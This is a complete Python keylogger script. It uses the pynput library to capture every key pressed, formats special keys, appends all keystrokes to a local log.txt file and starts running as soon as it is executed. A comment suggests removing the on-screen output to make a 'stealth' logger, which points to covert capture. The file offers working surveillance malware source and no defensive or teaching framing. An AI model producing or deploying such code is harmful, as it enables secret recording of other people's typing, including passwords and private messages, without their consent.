import pynput.keyboard

class KeyLogger:
    def __init__(self):
        self.log = "" 
        
    def append_to_log(self, key_strike):
        # IMPROVEMENT: Simplified logic - just append and write.
        self.log += key_strike

        
        with open("log.txt", "a+", encoding="utf-8") as new_file:
            new_file.write(key_strike)
            # You might want to remove this print in a "stealth" logger
            print(f"Logged: {key_strike.strip()}")
            
    def evaluate_keys (self, key):
        # This function is called every time a key is pressed.
        try:
            # If the key is a character (a-z, 0-9, etc.), it has a .char attribute.
            pressed_key = str(key.char)
            self.append_to_log(pressed_key)
            
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                pressed_key = " "
            elif key == pynput.keyboard.Key.enter:
                pressed_key = "\n"
            else:
                # Format other special keys (e.g., [Key.shift], [Key.ctrl])
                # We add spaces to separate them in the log file.
                pressed_key = f" [{str(key).split('.')[-1].upper()}] "
                
            self.append_to_log(pressed_key)
                                
    def start(self):
        # Create a listener that calls self.evaluate_keys when a key is pressed.
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys) 
        
        with keyboard_listener:
            print("--- KeyLogger Started ---")
            keyboard_listener.join()
KeyLogger().start()
